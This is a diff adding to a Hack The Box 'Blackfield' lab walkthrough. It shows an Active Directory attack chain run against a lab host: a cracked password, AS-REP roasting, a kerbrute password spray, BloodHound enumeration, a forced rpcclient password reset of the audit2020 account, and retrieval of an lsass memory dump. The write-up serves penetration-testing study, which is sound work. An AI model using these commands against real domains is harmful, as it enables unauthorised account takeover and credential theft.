@@ -106,6 +106,7 @@ smb: \> ls
   ...
 ```
 
+Lets try to find interesting files on the share
 ```
 $ sudo mkdir /mnt/htb
 $ sudo mount -t cifs '//10.10.10.192/profiles$' /mnt/htb 
@@ -116,6 +117,12 @@ ls /mnt/htb > users.lst
 cd /mnt/htb/
 find .
 ```
+No many useful files here. Lets umount the share
+```
+sudo umount /mnt/htb
+```
+
+
 
 download kerbrute from GitHub
 https://github.com/ropnop/kerbrute/releases/
@@ -173,5 +180,146 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 1g 0:00:00:22 DONE (2022-08-29 20:47) 0.04486g/s 643158p/s 643158c/s 643158C/s #1WIF3Y.."chito"
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
+```
+
+| username | password |
+| --- | --- |
+| support | #00^BlackKnight | 
+
+
+Lets check if we have access to any new files on the `profiles$` share.
+
+```
+$ smbclient '//10.10.10.192/profiles$' -U 'support'
+Password for [WORKGROUP\support]: #00^BlackKnight
+
+smb: \> ls support\
+  .                                   D        0  Wed Jun  3 09:47:12 2020
+  ..                                  D        0  Wed Jun  3 09:47:12 2020
+
+                5102079 blocks of size 4096. 1676779 blocks available
+```
+
+
+List users - GetADUsers.py
+```
+$ ~/impacket/examples/GetADUsers.py -dc-ip 10.10.10.192 -all 'blackfield.local/support:#00^BlackKnight'
+```
+
+List users - rpcclient
+```
+$ rpcclient dc01.BLACKFIELD.local -U 'support' 
+Password for [WORKGROUP\support]: #00^BlackKnight
+rpcclient $> enumdomusers
+```
+
+Clean list of users we got from RCP
+```
+cat rpc_users.lst.tmp | awk -F\[ '{print $2}' | awk -F\] '{print $1}' | sort -u > rpc_users.lst
+```
+
+Run again kerbrute with new list of users
+```
+~/Downloads/kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield -o kerbrute.rpc.userenum.out rpc_users.lst
+```
+
+create a file with the valid user list
+```
+$ cat kerbrute.rpc.userenum.out | grep 'VALID USERNAME' | awk '{print $7}' | awk -F@ '{print $1}' > valid_rpc_users.lst
+```
+
+Running GetNPUsers to perform an ASREP Roast
+```
+$ ~/impacket/examples/GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile valid_rpc_users.lst blackfield/
+```
+No new hashes.
+
+
+Passwordspray valid users with password of `support` user
+```
+~/Downloads/kerbrute_linux_amd64 passwordspray --dc 10.10.10.192 -d blackfield valid_rpc_users.lst '#00^BlackKnight'
+```
+
+This does not work as our local clock is too far from the domain one. However update the clock didn't work
+```
+$ sudo ntpdate 10.10.10.192
+ntpdig: no eligible servers
+```
+
+Let's get more data using bloodhound
+```
+mkdir bloodhound
+cd bloodbound
+$ bloodhound-python -ns 10.10.10.192 -d blackfield.local -u support -p '#00^BlackKnight' -c all 
+```
+
+Then we start bloodhound database (neo4j) and bloodhound
+```
+sudo neo4j console
+```
+```
+bloodhound
+```
+
+Investigating the details we got, we found out that the user `support` user can change the password of the `audit2020` user.
+
+![](images/bloodhound_support_01.png)
+![](images/bloodhound_support_02.png)
+
+
+We can perform this opearion using RPC.
+```
+$ rpcclient dc01.BLACKFIELD.local -U support 
+Password for [WORKGROUP\support]:#00^BlackKnight
+
+rpcclient $> setuserinfo2 Audit2020 23 'P@ssw0rd!'
+
+```
+
+Now if we try to list shares from the DC with the `Audit2020` user we see that we have READ access to `forensic` share.
+```
+$ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'P@ssw0rd!' --shares                           
+
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:P@ssw0rd! 
+SMB         10.10.10.192    445    DC01             [+] Enumerated shares
+SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
+SMB         10.10.10.192    445    DC01             -----           -----------     ------
+SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.10.192    445    DC01             C$                              Default share
+SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
+SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.10.192    445    DC01             profiles$       READ            
+SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
+```
+
+```
+$ smbclient '//10.10.10.192/forensic' -U 'Audit2020'
+Password for [WORKGROUP\Audit2020]: P@ssw0rd!
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Feb 23 05:03:16 2020
+  ..                                  D        0  Sun Feb 23 05:03:16 2020
+  commands_output                     D        0  Sun Feb 23 10:14:37 2020
+  memory_analysis                     D        0  Thu May 28 13:28:33 2020
+  tools                               D        0  Sun Feb 23 05:39:08 2020
+
+                5102079 blocks of size 4096. 1674475 blocks available
+```
+
+```
+$ mkdir smb
+cd smb 
+
+$ sudo mount -t cifs -o 'username=audit2020,password=P@ssw0rd!' '//10.10.10.192/forensic' /mnt/htb
+
+$ cp /mnt/htb/memory_analysis/lsass.zip .
+
+$ unzip lsass.zip   
+Archive:  lsass.zip
+  inflating: lsass.DMP
+
+$ sudo umount /mnt/htb 
 ```
 
